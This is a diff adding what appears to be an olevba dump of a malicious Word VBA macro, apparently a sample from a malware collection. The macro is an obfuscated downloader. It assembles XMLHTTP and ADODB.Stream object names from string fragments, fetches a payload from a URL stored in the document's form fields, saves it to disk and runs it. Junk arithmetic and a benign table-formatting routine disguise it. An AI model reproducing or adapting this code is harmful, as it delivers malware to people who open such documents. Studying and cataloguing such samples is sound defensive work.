@@ -1,0 +1,81 @@
+Filename     : ./macros/45f8c1de7d25c8a24246943ae194cb692add12efaab12d2689aa7a47e7d6b46a
+OLE stream   : Macros/VBA/undeformed
+VBA filename : undeformed.bas
+----------------------------------------
+Attribute VB_Name = "undeformed"
+Function cacophony(cockadoodledoo, trenchang)
+alluvium = 59 + 63 - 121
+herpestes = balinese.urging
+mustang = Left(herpestes, 2)
+sioux = 106 - 50
+elli = 98 - 55 + 50
+If sioux + elli <> 24 Then
+absently = Left("abareas", 2) + StrReverse("ypocsonimod")
+End If
+
+dual = mustang + "o" + Mid("coastlinedbsuerte", 10, 2) + Mid("sandbagger.Streamsidling", 11, 7)
+Set professed = CreateObject(dual)
+motorbike = CallByName(professed, "Open", VbMethod)
+professed.Type = 53 - 40 - 12
+marasmius = CallByName(professed, StrReverse("rW") + "ite", alluvium, cockadoodledoo.responseBody)
+helicopter = 3 - 128 + 152
+parodist = 56 + 17
+For helicopter = 3 - 128 + 152 To 56 + 17
+cerastium = "mo" + Ucase("tORist")
+Next helicopter
+
+asperula = CallByName(professed, StrReverse("vaS") + Lcase("etoFi") + "le", VbMethod, trenchang, 65 + 108 - 172)
+End Function
+
+
+Function etiolation()
+On Error Resume Next
+caviar = Mid("darkleMspellicularia", 7, 2) + Right("extrusivexml2", 4) + Lcase(".xmlHtT") + Mid("operandPsaick", 8, 1)
+Dim akkadian As String
+
+Set etiolation = CreateObject(caviar)
+xanthomonas = 20 - 16
+allochronic = 127 + 7 - 78
+For xanthomonas = 20 - 16 To 127 + 7 - 78
+dermatologist = StrReverse("ub") + Ucase("LLFI") + Right("brokerageghting", 6) + Lcase("")
+Next xanthomonas
+
+subsist = Ucase("get")
+Dim disingenuousness As String
+
+mezereon = chile.armchair
+cardiography = CallByName(etiolation, chile.Label1.Caption, VbMethod, subsist, mezereon, False)
+foes = 52 - 116 + 163
+gyrostabilizer = 117 + 10 - 34
+If foes + gyrostabilizer < 10 Then
+notability = Right("deathlesswt", 2) + Ucase("H") + Mid("demonolatryprovidently", 12, 0)
+End If
+
+etiolation.send
+
+End Function
+
+Sub FormatTablesSelect()
+Dim oTb As Table
+For Each oTb In ActiveDocument.Tables
+    Select Case oTb.Style
+        Case "Light Shading - Accent 4"
+            oTb.AutoFitBehavior (wdAutoFitFixed)
+            oTb.Rows.Alignment = wdAlignRowCenter
+            oTb.Columns.PreferredWidth = InchesToPoints(0.6)
+        Case "Medium List 2 - Accent 4"
+            oTb.AutoFitBehavior (wdAutoFitWindow)
+            oTb.Rows.Alignment = wdAlignRowLeft
+        Case "Table Grid", "Table Normal"
+            oTb.Style = "Light Grid - Accent 4"
+        Case Else
+            oTb.Style = "Medium List 1 - Accent 4"
+        End Select
+Next oTb
+End Sub
+
+Sub consistency(catalase, aposelene)
+Dim larva As Object
+causiticity = CallByName(catalase, "Run", VbMethod, aposelene)
+End Sub
+
